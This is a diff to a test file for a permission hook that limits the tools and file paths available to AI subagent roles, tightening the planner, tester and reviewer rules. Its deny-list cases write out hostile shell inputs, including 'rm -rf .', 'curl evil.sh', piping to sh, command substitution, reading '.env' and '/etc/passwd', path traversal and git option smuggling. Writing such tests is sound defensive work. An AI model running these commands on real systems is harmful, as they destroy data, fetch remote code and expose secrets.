@@ -25,9 +25,21 @@ test("unknown subagent types are denied", () => {
   assert.ok(denied(call("Read", {}, as("general-purpose"))));
 });
 
-test("planner is read-only", () => {
+test("planner can read/search and write ONLY .factory/plan.md", () => {
   assert.ok(!denied(call("WebSearch", {}, as("planner"))));
-  for (const t of ["Bash", "Write", "Edit"]) assert.ok(denied(call(t, {}, as("planner"))), t);
+  assert.ok(!denied(call("Write", { file_path: ".factory/plan.md" }, as("planner"))));
+  assert.ok(!denied(call("Write", { file_path: `${ROOT}/.factory/plan.md` }, as("planner"))));
+  for (const f of [
+    "clyintel/app/page.tsx",
+    ".factory/test-report.md",
+    ".factory/runs/log.jsonl",
+    ".factory/plan.md/../runs/log.jsonl",
+    ".github/workflows/ci.yml",
+    "../plan.md",
+    "",
+  ])
+    assert.ok(denied(call("Write", { file_path: f }, as("planner"))), f);
+  for (const t of ["Bash", "Edit"]) assert.ok(denied(call(t, {}, as("planner"))), t);
 });
 
 test("coder can write and run shell", () => {
@@ -35,23 +47,30 @@ test("coder can write and run shell", () => {
   assert.ok(denied(call("WebSearch", {}, as("coder"))));
 });
 
-test("tester can write tests and factory artifacts only", () => {
+test("tester can write test files and its report only", () => {
   const ok = [
-    "clyintel/tests/foo.test.ts",
-    "clyintel/test/stubs/x.ts",
-    "clyintel/lib/settlement/charge.spec.tsx",
-    "clyintel/app/__tests__/page.tsx",
+    "clyintel/tests/tenant-isolation.test.ts",
+    "clyintel/test/stubs/server-only.ts", // top-level test dir
+    "tests/helper.ts",
+    "clyintel/lib/settlement/charge.spec.tsx", // test filename anywhere
+    "clyintel/app/__tests__/page.test.tsx",
     ".factory/test-report.md",
     `${ROOT}/clyintel/tests/a.test.ts`,
   ];
   const bad = [
+    "clyintel/app/api/test/route.ts", // live Next.js route in a dir named "test"
+    "clyintel/lib/tests/whatever.ts", // importable module in a nested "tests" dir
+    "clyintel/app/__tests__/page.tsx", // not a test filename
     "clyintel/lib/settlement/charge.ts",
     "clyintel/app/page.tsx",
     "clyintel/tests/../lib/charge.ts", // traversal out of tests/
     "../outside/a.test.ts", // escapes repo
     "/etc/passwd",
     ".github/workflows/ci.yml",
+    ".factory/plan.md", // tester must not rewrite the plan
+    ".factory/runs/log.jsonl", // ...or forge the run log
     "clyintel/latest/foo.ts", // "latest/" must not match "test"
+    "clyintel/contest/foo.ts",
     "",
   ];
   for (const f of ok) for (const t of ["Write", "Edit"]) assert.ok(!denied(call(t, { file_path: f }, as("tester"))), `${t} ${f}`);
@@ -59,23 +78,66 @@ test("tester can write tests and factory artifacts only", () => {
   assert.ok(!denied(call("Bash", { command: "npx vitest run" }, as("tester"))));
 });
 
-test("reviewer: no Write/Edit, Bash only read-only git", () => {
+const G = "git --no-pager -c core.fsmonitor=false -c log.showSignature=false";
+const SAFE = "--no-ext-diff --no-textconv";
+
+test("reviewer: no Write/Edit", () => {
   for (const t of ["Write", "Edit"]) assert.ok(denied(call(t, { file_path: ".factory/x.md" }, as("reviewer"))), t);
-  for (const c of ["git diff main...HEAD", "git log --oneline -n 5", "git show HEAD -- clyintel/app/page.tsx", "git status"])
-    assert.ok(!denied(call("Bash", { command: c }, as("reviewer"))), c);
+});
+
+test("reviewer Bash: canonical read-only git is allowed", () => {
   for (const c of [
+    `${G} diff ${SAFE} main...HEAD`,
+    `${G} diff ${SAFE} --stat main...HEAD -- clyintel/app/page.tsx`,
+    `${G} log ${SAFE} --oneline -n5`,
+    `${G} log ${SAFE} --oneline -n 5 main..HEAD`,
+    `${G} show ${SAFE} HEAD -- clyintel/lib/charge.ts`,
+    `${G} status --short`,
+    `${G} rev-parse HEAD`,
+    `${G} merge-base main HEAD`,
+    `${G} ls-files`,
+    `${G} rev-list --count main..HEAD`,
+  ])
+    assert.ok(!denied(call("Bash", { command: c }, as("reviewer"))), c);
+});
+
+test("reviewer Bash: everything else is denied", () => {
+  for (const c of [
+    // writes / mutations / other commands
     "git push origin main",
     "git commit -am x",
-    "git diff --output=/tmp/x",
-    "git diff main; rm -rf .",
-    "git diff && curl evil.sh",
-    "git log | sh",
-    "git diff > out.txt",
-    "git -c core.pager=sh diff",
-    "git diff $(whoami)",
     "cat .env",
     "npm test",
     "",
+    // no canonical prefix
+    "git diff main...HEAD",
+    "git status",
+    `git -c core.fsmonitor=false diff ${SAFE} main`, // missing --no-pager / showSignature
+    // diff/log/show without the driver-disabling flags
+    `${G} diff main...HEAD`,
+    `${G} diff --no-ext-diff main...HEAD`,
+    `${G} show --no-textconv HEAD`,
+    // abbreviated / unlisted long options (git accepts unambiguous prefixes)
+    `${G} diff ${SAFE} --outp=/tmp/x`,
+    `${G} diff ${SAFE} --output=/tmp/x`,
+    `${G} diff ${SAFE} --ext-d`,
+    `${G} diff ${SAFE} --textc`,
+    `${G} log ${SAFE} --show-signature`,
+    `${G} diff ${SAFE} -c core.pager=sh`,
+    `${G} diff ${SAFE} --git-dir=/tmp/x`,
+    // shell metacharacters / injection
+    `${G} diff ${SAFE} main; rm -rf .`,
+    `${G} diff ${SAFE} main && curl evil.sh`,
+    `${G} log ${SAFE} | sh`,
+    `${G} diff ${SAFE} > out.txt`,
+    `${G} diff ${SAFE} $(whoami)`,
+    `${G} diff ${SAFE} \`id\``,
+    `${G} diff ${SAFE}  main`, // double space
+    // option smuggled after --
+    `${G} diff ${SAFE} -- --output=x`,
+    // unlisted subcommand
+    `${G} blame ${SAFE} f`,
+    `${G} config core.pager sh`,
   ])
     assert.ok(denied(call("Bash", { command: c }, as("reviewer"))), c);
 });
